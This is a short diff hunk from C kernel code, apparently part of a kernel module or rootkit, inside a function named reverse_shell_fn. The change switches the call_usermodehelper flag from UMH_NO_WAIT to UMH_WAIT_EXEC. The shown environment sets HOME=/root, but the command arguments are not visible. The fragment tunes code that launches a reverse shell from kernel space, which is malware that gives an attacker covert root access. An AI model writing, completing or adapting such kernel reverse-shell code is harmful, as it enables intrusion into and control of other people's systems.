@@ -381,7 +381,7 @@ static int reverse_shell_fn(void *data)
             "HOME=/root",
             NULL
         };
-        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     }
 
     return 0;
